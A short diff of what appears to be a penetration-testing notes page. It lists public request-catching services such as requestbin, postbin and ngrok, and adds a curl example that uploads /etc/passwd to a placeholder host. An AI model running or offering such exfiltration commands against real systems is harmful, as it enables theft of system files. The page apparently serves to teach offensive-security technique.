@@ -16,10 +16,14 @@ Otherwise, we may use online public solutions.
 
 For instance, we can use API Testing Platforms:
 
-* [requestbin](https://public.requestbin.com/r/)
-* [postbin](https://www.toptal.com/developers/postbin/)
-* [ngrok](https://ngrok.com/)
+* [requestbin](https://public.requestbin.com/r/) <small>(HTTP 🌍)</small>
+* [postbin](https://www.toptal.com/developers/postbin/) <small>(HTTP 🌍)</small>
+* [ngrok](https://ngrok.com/) <small>(HTTP 🌍 and TCP ⭐, account required 🪦)</small>
 * ...
+
+```ps
+$ curl http://XXX/xxxxxx -F "data=@/etc/passwd"
+```
 </div></div>
 
 <hr class="sep-both">
